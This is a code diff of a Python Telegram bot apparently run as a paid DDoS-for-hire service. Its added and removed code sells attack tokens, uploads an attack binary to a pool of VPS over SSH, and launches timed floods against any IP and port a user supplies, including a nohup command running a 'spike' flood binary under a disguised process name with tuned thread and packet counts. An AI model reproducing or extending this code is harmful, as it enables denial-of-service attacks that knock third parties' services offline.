+                logger.info(f"Disk space on {vps['ip']}:{vps['port']}: {disk_check.stdout}")
+
+                # Remove any existing binary
+                await conn.run(f"rm -f {BINARY_PATH}")
+
+                # Write the binary using base64 decoding
+                command = f"echo '{binary_base64}' | base64 -d > {BINARY_PATH}"
+                write_result = await conn.run(command)
+                if write_result.exit_status != 0:
+                    raise Exception(f"Failed to write binary: {write_result.stderr}")
+
+                # Set executable permissions
+                chmod_result = await conn.run(f"chmod +x {BINARY_PATH}")
+                if chmod_result.exit_status != 0:
+                    raise Exception(f"Failed to set executable permissions: {chmod_result.stderr}")
+
+                # Verify the binary exists
+                verify_result = await conn.run(f"test -f {BINARY_PATH} && echo 'exists' || echo 'not found'")
+                if verify_result.stdout.strip() != "exists":
+                    raise Exception("Binary upload failed: File not found after upload")
+        except Exception as e:
+            logger.error(f"🚨 Setup failed on VPS {vps['ip']}:{vps['port']}: {e}")
+            failed_vps.append(f"{vps['ip']}:{vps['port']}")
+
+    await asyncio.gather(*[setup_vps(vps) for vps in vps_list])
+    if failed_vps:
+        await update.message.reply_text(
+            f"⚠️ **Setup Failed on Some VPS:**\n"
+            f"Failed VPS: {', '.join(failed_vps)}\n"
+            f"Please check logs and ensure VPS is accessible!\n"
+            f"💻 Bot by @MrRanDom8"
+        )
+    else:
+        await update.message.reply_text(f"⚙️ **Setup Complete:** `{BINARY_NAME}` installed on all VPS!\n💻 Bot by @MrRanDom8")
+
+async def vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Set the default number of VPS for attacks (Owner only)."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if user_id != OWNER_ID:
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner can set the default VPS count!")
+        return
+    if len(args) != 1 or not args[0].isdigit():
+        await update.message.reply_text("❌ **Usage:** /vps [NUMBER_OF_VPS]")
+        return
+
+    global default_vps_count
+    default_vps_count = int(args[0])
+    db = get_mongo_client(None)
+    await asyncio.to_thread(db.config.update_one, {"key": "default_vps_count"}, {"$set": {"value": default_vps_count}}, upsert=True)
+    await update.message.reply_text(f"📦 **Default VPS Count Set:** {default_vps_count} VPS per attack\n💻 Bot by @MrRanDom8")
+
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Launch an attack on the target using the default number of VPS."""
+    user_id = update.message.from_user.id
+    args = context.args
+    if len(args) != 3:  # Expecting IP, PORT, SECONDS
+        await update.message.reply_text("❌ **Usage:** /attack [IP] [PORT] [SECONDS]")
+        return
+
+    ip, port, duration = args[0], args[1], args[2]
+
+    # Validate that duration is a plain number (no units)
+    if not duration.isdigit():
+        await update.message.reply_text("❌ **Error:** Duration must be a number in seconds (e.g., 20 for 20 seconds). Units like 'm', 'h', or 'd' are not allowed!\n💻 Bot by @MrRanDom8")
+        return
+
+    db = get_mongo_client(user_id)
+    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
+    if not user or user.get("tokens", 0) <= 0:
+        await update.message.reply_text("❌ **Error:** Insufficient tokens! Use /buytokens to get more!\n💻 Bot by @MrRanDom8")
+        return
+
+    # Check if there are any VPS available
+    if not vps_pool:
+        await update.message.reply_text("❌ **Error:** No VPS available! Add VPS with /add_vps!\n💻 Bot by @MrRanDom8")
+        return
+
+    # Use the default number of VPS
+    num_vps = default_vps_count
+
+    # Find available VPS
+    available_vps = [vps for vps in vps_pool if not vps_locks[f"{vps['ip']}:{vps['port']}"]]
+    if len(available_vps) < num_vps:
+        await update.message.reply_text(f"⏳ **Insufficient VPS Available:** Only {len(available_vps)} VPS are free, but {num_vps} are required!\n💻 Bot by @MrRanDom8")
+        return
+
+    # Allocate the requested number of VPS
+    allocated_vps = available_vps[:num_vps]
+    for vps in allocated_vps:
+        vps_locks[f"{vps['ip']}:{vps['port']}"] = True  # Mark as in use
+    logger.info(f"🔒 Allocated {num_vps} VPS to user {user_id} for attack on {ip}:{port}")
+
+    # Check if binary exists on all allocated VPS
+    missing_binary_vps = []
+    for vps in allocated_vps:
+        if not await check_binary_on_vps(vps):
+            missing_binary_vps.append(f"{vps['ip']}:{vps['port']}")
+    
+    if missing_binary_vps:
+        for vps in allocated_vps:
+            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS
+        await update.message.reply_text(
+            f"❌ **Error:** Binary `{BINARY_NAME}` not found on the following VPS:\n"
+            f"{', '.join(missing_binary_vps)}\n"
+            f"Please run /setup to install the binary!\n"
+            f"💻 Bot by @MrRanDom8"
+        )
         return
 
     try:
-        admin_id_to_remove = int(args[0])
-    except ValueError:
-        await context.bot.send_message(chat_id, "⚠️ *Galat Telegram ID!*", parse_mode="Markdown")
+        await asyncio.to_thread(db.users.update_one, {"user_id": user_id}, {"$inc": {"tokens": -1}})
+        task = {
+            "user_id": user_id,
+            "ip": ip,
+            "port": port,
+            "duration": duration,
+            "vps_ips": [f"{vps['ip']}:{vps['port']}" for vps in allocated_vps],
+            "status": "running",
+            "vps_status": {f"{vps['ip']}:{vps['port']}": "running" for vps in allocated_vps},
+            "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "end_time": None
+        }
+        task_id = str((await asyncio.to_thread(db.tasks.insert_one, task)).inserted_id)
+
+        initial_msg = await update.message.reply_text(
+            f"🚀 **Attack Launched**\n"
+            f"🎯 Target: `{ip}:{port}`\n"
+            f"📦 Allocated VPS: {num_vps}\n"
+            f"⏳ Time Left: Calculating...\n"
+            f"💻 Bot by @MrRanDom8"
+        )
+        await execute_batch_attack(task_id, user_id, ip, port, duration, allocated_vps, update, context, initial_msg.message_id, update.message.chat_id, allocated_vps)
+    except Exception as e:
+        logger.error(f"🚨 Error in attack for user {user_id}: {e}")
+        for vps in allocated_vps:
+            vps_locks[f"{vps['ip']}:{vps['port']}"] = False  # Release the VPS on error
+        await update.message.reply_text(f"❌ **Error During Attack:** {str(e)}\n💻 Bot by @MrRanDom8")
+
+async def check_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check the status of the VPS locks (Owner/Admin only)."""
+    user_id = update.message.from_user.id
+    db = get_mongo_client(user_id)
+    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
+    role = user.get("role", "member") if user else "member"
+
+    if user_id != OWNER_ID and role != "admin":
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner and Admins can check the lock status!\n💻 Bot by @MrRanDom8")
         return
 
-    if admin_id_to_remove == OWNER_USER_ID:
-        await context.bot.send_message(chat_id, "❌ *Owner khud ko remove nahi kar sakta!*", parse_mode="Markdown")
+    vps_status = "\n".join([f"🌐 {vps_key}: {'🔒 In Use' if vps_locks[vps_key] else '🔓 Available'}" for vps_key in vps_locks])
+    await update.message.reply_text(f"🔍 **VPS Lock Status**\n━━━━━━━━━━━━━━━━━━━━━━\n{vps_status}\n━━━━━━━━━━━━━━━━━━━━━━\n💻 Bot by @MrRanDom8")
+
+async def release_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Manually release all VPS locks (Owner/Admin only)."""
+    user_id = update.message.from_user.id
+    db = get_mongo_client(user_id)
+    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
+    role = user.get("role", "member") if user else "member"
+
+    if user_id != OWNER_ID and role != "admin":
+        await update.message.reply_text("🚫 **Access Denied:** Only Owner and Admins can release the lock!\n💻 Bot by @MrRanDom8")
         return
 
-    result = admins_collection.delete_one({"user_id": admin_id_to_remove})
-    if result.deleted_count > 0:
-        await context.bot.send_message(chat_id, f"✅ *Admin {admin_id_to_remove} successfully remove kar diya gaya!*", parse_mode="Markdown")
-    else:
-        await context.bot.send_message(chat_id, f"⚠️ *Admin {admin_id_to_remove} nahi mila!*", parse_mode="Markdown")
+    for vps_key in vps_locks:
+        vps_locks[vps_key] = False
+    logger.info(f"🔓 All VPS locks manually released by user {user_id}")
+    await update.message.reply_text("🔓 **All VPS Locks Released Manually!**\n💻 Bot by @MrRanDom8")
 
-# List admins command
-async def list_admins(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
+async def check_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check user's token balance."""
+    user_id = update.message.from_user.id
+    db = get_mongo_client(user_id)
+    user = await asyncio.to_thread(db.users.find_one, {"user_id": user_id})
+    tokens = user.get("tokens", 0) if user else 0
+    await update.message.reply_text(f"💰 **Token Balance:** `{tokens}`\n💻 Bot by @MrRanDom8")
 
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Sirf owner admins ki list dekh sakta hai!*", parse_mode="Markdown")
+async def buy_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Request to buy tokens and notify the owner."""
+    user_id = update.message.from_user.id
+    username = update.message.from_user.username or "Unknown"
+    args = context.args
+    if len(args) < 1:
+        await update.message.reply_text("❌ **Usage:** /buytokens [AMOUNT]")
         return
 
-    admins = list(admins_collection.find())
-    if not admins:
-        await context.bot.send_message(chat_id, "📋 *Koi admins nahi hain!*", parse_mode="Markdown")
-        return
+    amount = int(args[0])
+    user_response = f"🛒 **Token Request Sent:** `{amount}` tokens\nPlease wait for approval from @MrRanDom8!\n💻 Bot by @MrRanDom8"
+    owner_notification = (
+        f"🔔 **New Token Request**\n"
+        f"👤 User: @{username} (ID: `{user_id}`)\n"
+        f"💰 Amount: `{amount}` tokens\n"
+        f"📅 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
+        f"💻 Bot by @MrRanDom8"
+    )
 
-    message = "*✅ Admin List:*\n\n"
-    for admin in admins:
-        admin_id = admin.get("user_id", "Unknown")
-        expiry = admin.get("expiry", "Unknown")
-        if expiry != "Unknown":
-            expiry = expiry.strftime("%Y-%m-%d %H:%M:%S UTC")
-        message += f"👤 *Admin ID:* `{admin_id}` | ⏳ *Expires:* `{expiry}`\n"
-    await context.bot.send_message(chat_id, text=message, parse_mode="Markdown")
+    await update.message.reply_text(user_response)
+    await context.bot.send_message(chat_id=OWNER_ID, text=owner_notification)
 
-# PKT command (owner only)
-async def pkt_command(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can configure packet size!*", parse_mode="Markdown")
-        return
-
-    keyboard = [
-        [InlineKeyboardButton("AWS Packet Size", callback_data="aws_pkt_size")],
-        [InlineKeyboardButton("Normal Packet Size", callback_data="normal_pkt_size")],
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await context.bot.send_message(chat_id, "📏 *Select Packet Size to Configure:*", parse_mode="Markdown", reply_markup=reply_markup)
-
-# THREAD command (owner only)
-async def thread_command(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can configure thread count!*", parse_mode="Markdown")
-        return
-
-    keyboard = [
-        [InlineKeyboardButton("AWS Thread Count", callback_data="aws_thread")],
-        [InlineKeyboardButton("Normal Thread Count", callback_data="normal_thread")],
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await context.bot.send_message(chat_id, "🧵 *Select Thread Count to Configure:*", parse_mode="Markdown", reply_markup=reply_markup)
-
-# Callback query handler for PKT and THREAD (owner only)
-async def handle_callback(update: Update, context: CallbackContext):
+# Feedback Handler
+async def feedback_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle feedback from attack results."""
     query = update.callback_query
-    chat_id = query.message.chat_id
+    await query.answer()
+    task_id, feedback = query.data.split("_")[1:]
     user_id = query.from_user.id
 
-    if not is_owner(user_id):
-        await query.answer("❌ You are not authorized!", show_alert=True)
-        return
-
-    config_type = query.data
-    context.user_data["config_type"] = config_type
-    await query.answer()
-    await context.bot.send_message(chat_id, f"📝 *Enter the value for {config_type} (numeric only):*", parse_mode="Markdown")
-
-# Handle text input for configuration (owner only)
-async def handle_config_input(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    text = update.message.text
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can configure settings!*", parse_mode="Markdown")
-        return
-
-    config_type = context.user_data.get("config_type")
-    if not config_type:
-        await context.bot.send_message(chat_id, "⚠️ *Pehle /PKT ya /THREAD use karein!*", parse_mode="Markdown")
-        return
-
-    try:
-        value = int(text)
-        if value <= 0:
-            await context.bot.send_message(chat_id, "❌ *Value positive hona chahiye!*", parse_mode="Markdown")
-            return
-    except ValueError:
-        await context.bot.send_message(chat_id, "❌ *Sirf numeric value enter karein!*", parse_mode="Markdown")
-        return
-
-    settings_collection.update_one(
-        {"name": config_type},
-        {"$set": {"value": value}},
-        upsert=True
-    )
-    await context.bot.send_message(chat_id, f"✅ *{config_type} set to {value} successfully!*", parse_mode="Markdown")
-    context.user_data.pop("config_type", None)
-
-# VPS status command
-async def vps_status(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can check VPS status!*", parse_mode="Markdown")
-        return
-
-    vps_list = list(vps_collection.find({"user_id": user_id}))
-    aws_vps_list = list(aws_vps_collection.find({"user_id": user_id}))
-
-    if not vps_list and not aws_vps_list:
-        await context.bot.send_message(chat_id, "❌ *No VPS configured!* Use /add_vps or /add_aws_vps.", parse_mode="Markdown")
-        return
-
-    message = "*🔧 VPS Status:*\n\n"
-    
-    tasks = [check_vps_alive(vps, "regular") for vps in vps_list]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    
-    for vps, result in zip(vps_list, results):
-        ip = vps.get("ip", "Unknown")
-        ssh_port = vps.get("ssh_port", 22)  # Show SSH port
-        username = vps.get("username", "Unknown")
-        cooldown = "On Cooldown" if is_vps_on_cooldown(ip, "regular") else "Ready"
-        alive_status = "Alive" if result is True else "Dead"
-        message += f"🌍 *VPS:* `{ip}` | 🔌 *SSH Port:* `{ssh_port}` | 👤 *User:* `{username}` | ⏳ *Cooldown:* `{cooldown}` | 💡 *Status:* `{alive_status}`\n"
-
-    tasks = [check_vps_alive(vps, "aws") for vps in aws_vps_list]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    
-    for vps, result in zip(aws_vps_list, results):
-        ip = vps.get("ip", "Unknown")
-        username = vps.get("username", "Unknown")
-        pem_path = vps.get("pem_file", "Unknown")
-        pem_filename = os.path.basename(pem_path) if pem_path != "Unknown" else "Unknown"
-        cooldown = "On Cooldown" if is_vps_on_cooldown(ip, "aws") else "Ready"
-        alive_status = "Alive" if result is True else "Dead"
-        message += f"☁️ *AWS VPS:* `{ip}` | 👤 *User:* `{username}` | 🔑 *PEM:* `{pem_filename}` | ⏳ *Cooldown:* `{cooldown}` | 💡 *Status:* `{alive_status}`\n"
-
-    await context.bot.send_message(chat_id, text=message, parse_mode="Markdown")
-
-
-
-# Attack command with countdown timer
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-    global attack_running
-    # Authorization check
-    if not (is_admin(user_id) or is_approved(user_id)):
-        await context.bot.send_message(chat_id, "❌ You are not approved to use this command. Contact the admin.", parse_mode="Markdown")
-        return
-
-    if not is_admin(user_id) and is_approved(user_id):
-        user_approval = approved_users_collection.find_one({"user_id": user_id})
-        current_time = datetime.datetime.utcnow()
-        if user_approval["expiry"] < current_time:
-            approved_users_collection.delete_one({"user_id": user_id})
-            await context.bot.send_message(chat_id, "❌ *Your approval has expired! Contact the admin for renewal.*", parse_mode="Markdown")
-            return
-
-    
-
-    args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id, "⚠️ Usage: /attack <ip> <port> <duration>", parse_mode="Markdown")
-        return
-
-    target_ip, port, duration = args
-    try:
-        port = int(port)
-        duration = int(duration)
-    except ValueError:
-        await context.bot.send_message(chat_id, "⚠️ Port aur duration numbers hone chahiye!", parse_mode="Markdown")
-        return
-
-    if duration > 1000:
-        await context.bot.send_message(chat_id, "❌ Attack duration 1000 seconds se kam hona chahiye!", parse_mode="Markdown")
-        return
-    if attack_running:
-        await context.bot.send_message(chat_id, "⚠️ An attack is already running! Please wait for it to finish before starting another.", parse_mode="Markdown")
-        return
-
-    # ✅ Set attack status to running
-    attack_running = True
-
-    vps_list = list(vps_collection.find())
-    aws_vps_list = list(aws_vps_collection.find())
-
-    if not vps_list and not aws_vps_list:
-        await context.bot.send_message(chat_id, "❌ No proxy available! Contact the admin to add proxy.", parse_mode="Markdown")
-        return
-
-    # Filter available VPS (not on cooldown)
-    available_vps = [vps for vps in vps_list if not is_vps_on_cooldown(vps["ip"], "regular")]
-    available_aws_vps = [vps for vps in aws_vps_list if not is_vps_on_cooldown(vps["ip"], "aws")]
-
-    total_vps = len(available_vps) + len(available_aws_vps)
-    if total_vps == 0:
-        await context.bot.send_message(chat_id, "❌ Sabhi proxy cooldown pe hain! Thodi der baad try karein.", parse_mode="Markdown")
-        return
-
-    aws_pkt_size = settings_collection.find_one({"name": "aws_pkt_size"}) or {"value": 6}
-    normal_pkt_size = settings_collection.find_one({"name": "normal_pkt_size"}) or {"value": 1024}
-    aws_thread = settings_collection.find_one({"name": "aws_thread"}) or {"value": 900}
-    normal_thread = settings_collection.find_one({"name": "normal_thread"}) or {"value": 900}
-
-    # Send initial attack message
-    message = await context.bot.send_message(chat_id, f"🔥 Attack started on {target_ip}:{port} using {total_vps} Proxy for {duration} seconds!", parse_mode="Markdown")
-    message_id = message.message_id
-
-    # Start attack tasks
-    success_count = {"regular": 0, "aws": 0}  # Track successful attacks
-
-    attack_tasks = []
-    for vps in available_vps:
-        attack_tasks.append(run_ssh_attack(vps, target_ip, port, duration, chat_id, context, "regular", normal_pkt_size["value"], normal_thread["value"], success_count))
-
-    for vps in available_aws_vps:
-        attack_tasks.append(run_ssh_attack(vps, target_ip, port, duration, chat_id, context, "aws", aws_pkt_size["value"], aws_thread["value"], success_count))
-
-    # ✅ Run Timer & Attack in Parallel using create_task (NON-BLOCKING)
-    asyncio.create_task(update_timer(context, chat_id, message_id, target_ip, port, total_vps, duration))
-    asyncio.create_task(run_attack(attack_tasks, available_vps, available_aws_vps, chat_id, context, target_ip, port, total_vps, duration, success_count))
-
- 
-    await context.bot.send_message(chat_id, "✅ Attack has been started in the background!", parse_mode="Markdown")
-    
-
-async def update_timer(context, chat_id, message_id, target_ip, port, total_vps, duration):
-    remaining_time = duration
-    while remaining_time > 0:
-        try:
-            await context.bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=f"🔥 Attack in progress on {target_ip}:{port} using {total_vps} Proxy - {remaining_time} seconds remaining!",
-                parse_mode="Markdown"
-            )
-        except telegram.error.BadRequest as e:
-            if "Message is not modified" not in str(e):
-                logger.error(f"Error updating timer: {str(e)}")
-        except telegram.error.TimedOut:
-            logger.warning("Telegram API timeout while updating timer")
-        await asyncio.sleep(1)
-        remaining_time -= 1
-
-    # Final update at 0 seconds
-    try:
-        await context.bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=f"🔥 Attack on {target_ip}:{port} completed using {total_vps} Proxy!",
-            parse_mode="Markdown"
-        )
-    except telegram.error.BadRequest:
-        pass
-
-async def run_attack(attack_tasks, available_vps, available_aws_vps, chat_id, context, target_ip, port, total_vps, duration, success_count):
-    global attack_running  # ✅ Ensure attack_running is updated properly
- 
-    attack_results = await asyncio.gather(*attack_tasks, return_exceptions=True)  # ✅ Attack will now actually run for duration
-
-    # ✅ Apply Cooldown After Attack Finishes
-    for vps in available_vps:
-        set_vps_cooldown(vps["ip"], "regular", duration)
-    for vps in available_aws_vps:
-        set_vps_cooldown(vps["ip"], "aws", duration)
-
-    # ✅ Send Final Completion Messages After Attack Finishes
-    await context.bot.send_message(chat_id, f"✅ Attack on {target_ip}:{port} has finished using {total_vps} Proxy!", parse_mode="Markdown")
-
-    # ✅ Log Errors if any Attack Tasks Failed
-    for result in attack_results:
-        if isinstance(result, Exception):
-            logger.error(f"Attack task failed: {str(result)}")
-
-    # ✅ Send Success Count Updates
-    if success_count["aws"] > 0:
-        await context.bot.send_message(chat_id, f"✅ Attack executed successfully on {success_count['aws']} AWS Proxy!", parse_mode="Markdown")
-    else:
-        await context.bot.send_message(chat_id, "⚠️ No successful attacks on AW Proxy!", parse_mode="Markdown")
-    
-    if success_count["regular"] > 0:
-        await context.bot.send_message(chat_id, f"✅ Attack executed successfully on {success_count['regular']} Normal Proxy!", parse_mode="Markdown")
-    else:
-        await context.bot.send_message(chat_id, "⚠️ No successful attacks on Normal Proxy!", parse_mode="Markdown")
-
-    attack_running = False
-
-# Updated run_ssh_attack function
-async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, attack_type="regular", pkt_size=1024, thread_count=900, success_count=None):
-    async with SSH_SEMAPHORE:
-        try:
-            if attack_type == "aws" and "pem_file" in vps_data:
-                logger.info(f"Connecting to AWS VPS {vps_data['ip']} on port {vps_data.get('ssh_port', 22)}")
-                conn = await asyncssh.connect(
-                    vps_data["ip"], 
-                    port=vps_data.get("ssh_port", 22),
-                    username=vps_data["username"], 
-                    client_keys=[vps_data["pem_file"]], 
-                    known_hosts=None
-                )
-            else:
-                logger.info(f"Connecting to Regular VPS {vps_data['ip']} on port {vps_data.get('ssh_port', 22)}")
-                conn = await asyncssh.connect(
-                    vps_data["ip"], 
-                    port=vps_data.get("ssh_port", 22),
-                    username=vps_data["username"], 
-                    password=vps_data["password"], 
-                    known_hosts=None
-                )
-
-            # ✅ Run attack command in background
-            command = f"nohup bash -c 'exec -a spike ./spike {target_ip} {port} {duration} {pkt_size} {thread_count}' > attack.log 2>&1 & echo $! > attack_pid.txt"
-            result = await conn.run(command, check=False)
-            logger.info(f"Executing command on {vps_data['ip']}: {command}")
-
-            # ✅ Wait for attack to complete before returning
-            await asyncio.sleep(duration)
-
-            if success_count is not None:
-                success_count[attack_type] += 1
-            return result
-
-        except asyncssh.Error as e:
-            logger.error(f"SSH error on {vps_data['ip']} ({attack_type}): {str(e)}")
-            await context.bot.send_message(chat_id, f"❌ SSH error on {vps_data['ip']} ({attack_type}): {str(e)}", parse_mode="Markdown")
-        except Exception as e:
-            logger.error(f"Unexpected error on {vps_data['ip']} ({attack_type}): {str(e)}")
-            await context.bot.send_message(chat_id, f"❌ Unexpected error on {vps_data['ip']} ({attack_type}): {str(e)}", parse_mode="Markdown")
-        finally:
-            if 'conn' in locals():
-                await conn.close()  # Close SSH connection after starting attack
-
-
-# Other commands
-async def add_user(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_admin(user_id):
-        await context.bot.send_message(chat_id, "❌ *You are not authorized to add users!*", parse_mode="Markdown")
-        return
-
-    args = context.args
-    if len(args) != 2:
-        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_user <telegram_id> <days_valid>*", parse_mode="Markdown")
-        return
-
-    new_user_id, days_valid = args
-    try:
-        new_user_id = int(new_user_id)
-        days_valid = int(days_valid)
-    except ValueError:
-        await context.bot.send_message(chat_id, "⚠️ *Galat Telegram ID ya days_valid!*", parse_mode="Markdown")
-        return
-
-    expiry_date = datetime.datetime.utcnow() + datetime.timedelta(days=days_valid)
-    approved_users_collection.update_one(
-        {"user_id": new_user_id},
-        {"$set": {"user_id": new_user_id, "expiry": expiry_date}},
-        upsert=True
-    )
-    await context.bot.send_message(chat_id, f"✅ *User {new_user_id} approved for {days_valid} days!*", parse_mode="Markdown")
-
-async def remove_user(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_admin(user_id):
-        await context.bot.send_message(chat_id, "❌ *You are not authorized to remove users!*", parse_mode="Markdown")
-        return
-
-    args = context.args
-    if len(args) != 1:
-        await context.bot.send_message(chat_id, "⚠️ *Usage: /remove_user <telegram_id>*", parse_mode="Markdown")
-        return
-
-    try:
-        target_user_id = int(args[0])
-    except ValueError:
-        await context.bot.send_message(chat_id, "⚠️ *Galat Telegram ID!*", parse_mode="Markdown")
-        return
-
-    result = approved_users_collection.delete_one({"user_id": target_user_id})
-    if result.deleted_count > 0:
-        await context.bot.send_message(chat_id, f"✅ *User {target_user_id} has been removed!*", parse_mode="Markdown")
-    else:
-        await context.bot.send_message(chat_id, f"⚠️ *User {target_user_id} was not found!*", parse_mode="Markdown")
-
-async def list_users(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_admin(user_id):
-        await context.bot.send_message(chat_id, "❌ *You are not authorized to view the user list!*", parse_mode="Markdown")
-        return
-
-    users = list(approved_users_collection.find())
-    if not users:
-        await context.bot.send_message(chat_id, "📋 *No approved users found!*", parse_mode="Markdown")
-        return
-
-    message = "*✅ Approved Users:*\n\n"
-    for user in users:
-        user_id = user.get("user_id", "Unknown")
-        expiry = user.get("expiry", "Unknown")
-        if expiry != "Unknown":
-            expiry = expiry.strftime("%Y-%m-%d %H:%M:%S UTC")
-        message += f"👤 *User:* `{user_id}` | ⏳ *Expires:* `{expiry}`\n"
-    await context.bot.send_message(chat_id, text=message, parse_mode="Markdown")
-
-# Updated /add_vps with SSH port
-async def add_vps(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can add VPS!*", parse_mode="Markdown")
-        return
-
-    args = context.args
-    if len(args) != 4:
-        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_vps <ip> <ssh_port> <username> <password>*", parse_mode="Markdown")
-        return
-
-    ip, ssh_port, username, password = args
-    try:
-        ssh_port = int(ssh_port)  # Ensure SSH port is a valid integer
-        if ssh_port < 1 or ssh_port > 65535:
-            await context.bot.send_message(chat_id, "❌ *SSH port 1 se 65535 ke beech hona chahiye!*", parse_mode="Markdown")
-            return
-    except ValueError:
-        await context.bot.send_message(chat_id, "⚠️ *SSH port ek valid number hona chahiye!*", parse_mode="Markdown")
-        return
-
-    vps_collection.insert_one({"user_id": user_id, "ip": ip, "ssh_port": ssh_port, "username": username, "password": password})
-    await context.bot.send_message(chat_id, f"✅ *VPS {ip} added successfully with SSH port {ssh_port}!*", parse_mode="Markdown")
-
-async def add_aws_vps(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can add AWS VPS!*", parse_mode="Markdown")
-        return
-
-    args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id, "⚠️ *Usage: /add_aws_vps <ip> <username> <pem_filename>*", parse_mode='Markdown')
-        return
-
-    ip, username, pem_filename = args
-    aws_vps_collection.insert_one({"user_id": user_id, "ip": ip, "username": username, "pem_file": f"{PEM_FILE_DIR}{pem_filename}"})
-    await context.bot.send_message(chat_id, "✅ *AWS VPS added successfully!*", parse_mode='Markdown')
-
-async def upload_pem_command(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can upload PEM files!*", parse_mode="Markdown")
-        return
-
-    await context.bot.send_message(chat_id, "📂 *Please upload your .pem file now.*", parse_mode="Markdown")
-
-async def handle_pem_upload(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can upload PEM files!*", parse_mode="Markdown")
-        return
-
-    document = update.message.document
-    file_name = document.file_name.lower()
-
-    if not file_name.endswith(".pem"):
-        await context.bot.send_message(chat_id, "❌ *Use /upload_binary for non-.pem files!*", parse_mode="Markdown")
-        return
-
-    file_path = os.path.join(PEM_FILE_DIR, file_name)
-    file = await context.bot.get_file(document.file_id)
-    await file.download_to_drive(file_path)
-
-    with open(file_path, "rb") as f:
-        pem_data = f.read()
-
-    settings_collection.update_one(
-        {"name": "pem_file"},
-        {"$set": {"pem": Binary(pem_data), "file_name": file_name}},
-        upsert=True
-    )
-    await context.bot.send_message(chat_id, f"✅ *PEM file uploaded and stored in MongoDB!*\n📂 Path: `{file_path}`", parse_mode="Markdown")
-
-async def upload_binary_command(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can upload binaries!*", parse_mode="Markdown")
-        return
-
-    await context.bot.send_message(chat_id, "📂 *Please upload your binary file now.*", parse_mode="Markdown")
-
-async def handle_binary_upload(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
-
-    if not is_owner(user_id):
-        await context.bot.send_message(chat_id, "❌ *Only owner can upload binaries!*", parse_mode="Markdown")
-        return
-
-    document = update.message.document
-    if not document:
-        await context.bot.send_message(chat_id, "❌ *No document found! Please upload a file.*", parse_mode="Markdown")
-        return
-
-    file_name = document.file_name.lower()
-    if file_name.endswith(".pem"):
-        await context.bot.send_message(chat_id, "❌ *Use /upload_pem for .pem files!*", parse_mode="Markdown")
-        return
-
-    file_path = os.path.join(BINARY_FILE_DIR, file_name)
-    file = await context.bot.get_file(document.file_id)
-    await file.download_to_drive(file_path)
-
-    with open(file_path, "rb") as f:
-        binary_data = f.read()
-
-    settings_collection.update_one(
-        {"name": "binary_file"},
-        {"$set": {"binary": Binary(binary_data), "file_name": file_name}},
-        upsert=True
-    )
-    await context.bot.send_message(chat_id, f"✅ *Binary file uploaded and stored!*\n📂 Path: `{file_path}`", parse_mode="Markdown")
-
-async def setup_vps(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
